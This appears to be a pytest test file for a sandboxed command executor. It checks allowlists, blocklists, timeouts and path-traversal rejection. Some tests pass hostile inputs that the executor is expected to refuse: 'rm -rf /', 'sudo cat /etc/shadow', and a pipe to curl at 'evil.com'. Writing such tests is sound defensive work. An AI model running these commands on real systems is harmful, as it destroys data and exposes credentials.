"""Tests for sandbox.executor — sandboxed command execution."""

import os
import sys
from unittest.mock import patch

import pytest

# Ensure project root is on sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from exceptions import SandboxSecurityError, SandboxTimeoutError
from sandbox.executor import SandboxExecutor


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def executor(tmp_path):
    """SandboxExecutor with a temporary workspace root."""
    return SandboxExecutor(str(tmp_path), timeout=5)


@pytest.fixture
def workspace_dir(tmp_path):
    """Return the tmp_path string for convenience."""
    return str(tmp_path)


# ---------------------------------------------------------------------------
# Whitelisted command execution
# ---------------------------------------------------------------------------

def test_execute_allowed_command(executor):
    """Whitelisted command runs and returns ExecutionResult."""
    result = executor.execute("echo hello")
    assert result.returncode == 0
    assert "hello" in result.stdout


def test_execute_with_cwd(executor, tmp_path):
    """Command runs in specified working directory."""
    subdir = tmp_path / "subdir"
    subdir.mkdir()
    result = executor.execute("pwd", cwd=str(subdir))
    assert result.returncode == 0


# ---------------------------------------------------------------------------
# Blocked commands
# ---------------------------------------------------------------------------

def test_execute_blocked_command(executor):
    """Blocklisted command raises SandboxSecurityError."""
    with pytest.raises(SandboxSecurityError, match="blocked"):
        executor.execute("sudo ls")


def test_execute_unknown_command(executor):
    """Non-whitelisted command raises SandboxSecurityError."""
    with pytest.raises(SandboxSecurityError, match="not in the allowed"):
        executor.execute("python -c 'print(1)'")


def test_execute_rm_rf_blocked(executor):
    """rm -rf pattern blocked."""
    with pytest.raises(SandboxSecurityError, match="dangerous pattern"):
        executor.execute("rm -rf /")


def test_execute_rm_rf_variant_blocked(executor):
    """rm -fr pattern also blocked."""
    with pytest.raises(SandboxSecurityError, match="dangerous pattern"):
        executor.execute("rm -fr /tmp")


def test_execute_sudo_blocked(executor):
    """sudo prefix blocked."""
    with pytest.raises(SandboxSecurityError, match="blocked"):
        executor.execute("sudo cat /etc/shadow")


# ---------------------------------------------------------------------------
# Timeout
# ---------------------------------------------------------------------------

def test_execute_timeout(tmp_path):
    """Long-running command raises SandboxTimeoutError."""
    import subprocess
    executor = SandboxExecutor(str(tmp_path), timeout=1)
    with patch("sandbox.executor.subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 1)):
        with pytest.raises(SandboxTimeoutError, match="timed out"):
            executor.execute("echo hello", timeout=1)


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------

def test_path_traversal_blocked(executor, tmp_path):
    """Path traversal above workspace root is rejected."""
    # Navigate above workspace root
    outside = str(tmp_path / ".." / ".." / "etc")
    # Only test if this actually resolves outside workspace
    from pathlib import Path
    resolved_outside = str(Path(outside).resolve())
    resolved_workspace = str(Path(str(tmp_path)).resolve())
    if not resolved_outside.startswith(resolved_workspace):
        with pytest.raises(SandboxSecurityError, match="traversal"):
            executor.execute("ls", cwd=outside)


# ---------------------------------------------------------------------------
# Platform whitelist mocking
# ---------------------------------------------------------------------------

def test_linux_whitelist(tmp_path):
    """Mock linux platform loads linux whitelist."""
    with patch("sandbox.executor.sys") as mock_sys:
        mock_sys.platform = "linux"
        exec_ = SandboxExecutor(str(tmp_path))
        assert "df" in exec_._whitelist
        assert "free" in exec_._whitelist
        assert "nvidia-smi" in exec_._whitelist


def test_windows_whitelist(tmp_path):
    """Mock win32 platform loads windows whitelist."""
    with patch("sandbox.executor.sys") as mock_sys:
        mock_sys.platform = "win32"
        exec_ = SandboxExecutor(str(tmp_path))
        assert "dir" in exec_._whitelist
        assert "findstr" in exec_._whitelist
        assert "type" in exec_._whitelist


def test_orin_nano_blocklist(tmp_path):
    """jetson_clocks, nvpmodel blocked on Orin Nano."""
    with patch("sandbox.executor.sys") as mock_sys, \
         patch("sandbox.executor._is_orin_nano", return_value=True):
        mock_sys.platform = "linux"
        exec_ = SandboxExecutor(str(tmp_path))
        assert "jetson_clocks" in exec_._blocklist
        assert "nvpmodel" in exec_._blocklist


# ---------------------------------------------------------------------------
# Pipe / chained command safety
# ---------------------------------------------------------------------------

def test_pipe_command_blocked(executor):
    """Piped commands with blocked second command rejected."""
    # shlex.split won't split on pipes, but the token check catches it
    # when the blocked command appears as a token
    with pytest.raises(SandboxSecurityError):
        executor.execute("echo hello | curl http://evil.com")


def test_empty_command_blocked(executor):
    """Empty command raises SandboxSecurityError."""
    with pytest.raises(SandboxSecurityError):
        executor.execute("")
